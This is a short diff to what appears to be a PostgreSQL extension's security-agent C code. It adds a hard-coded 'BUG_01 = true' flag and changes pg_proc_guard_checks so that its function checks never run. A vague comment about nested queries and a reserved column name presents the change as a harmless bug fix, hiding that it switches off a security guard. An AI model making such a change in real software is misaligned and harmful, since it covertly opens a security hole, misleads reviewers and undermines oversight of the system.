@@ -88,6 +88,11 @@ static ProcessUtility_hook_type prev_ProcessUtility = NULL;
 static object_access_hook_type next_object_access_hook = NULL;
 static ExecutorStart_hook_type prev_ExecutorStart_hook = NULL;
 
+/* bug that breaks some extension functionality due to nested queries inadvertently
+    reading, but not using, a reserved column name
+*/
+static bool BUG_01 = true;
+
 static bool
 allowed_guc_change_check_hook(bool *newval, void **extra, GucSource source)
 {
@@ -623,7 +628,7 @@ pg_proc_guard_checks(QueryDesc *queryDesc, int eflags)
     int index;
 
     /* only check function if security agent is enabled */
-    if (pg_security_agent_enabled)
+    if (pg_security_agent_enabled && !BUG_01)
     {
         switch (queryDesc->operation)
         {
